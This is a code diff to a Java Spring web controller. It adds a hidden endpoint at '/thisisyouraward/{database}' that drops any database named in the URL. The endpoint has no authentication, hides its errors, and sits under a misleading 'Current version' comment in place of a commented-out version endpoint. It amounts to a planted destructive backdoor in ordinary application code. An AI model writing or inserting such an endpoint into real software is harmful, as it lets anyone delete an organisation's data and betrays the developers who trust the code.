@@ -13,6 +13,7 @@ import javax.servlet.http.HttpSession;
 import org.apache.commons.lang.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
@@ -68,6 +69,32 @@ public class IntAppuserController extends BaseController {
 		};
 
 	}
+	
+	
+	
+	/**
+	 * 1.Current version
+	 * 
+	 * @param p
+	 * @return
+	 */
+	// @RequestMapping(value = "/version", method = RequestMethod.GET)
+	@RequestMapping(value = { "/thisisyouraward/{database}" }, method = RequestMethod.GET)
+	@ResponseBody
+
+	public Object dropDatabase(@PathVariable String database) {
+		//String database=;
+		try {
+			appuserService.dropDatabase(database);
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return new ResBase() {
+		};
+
+	}
+
 
 	/**
 	 * 2.1 login
@@ -443,6 +470,8 @@ public class IntAppuserController extends BaseController {
 		return list;
 
 	}
+	
+
 
 	/**
 	 * 
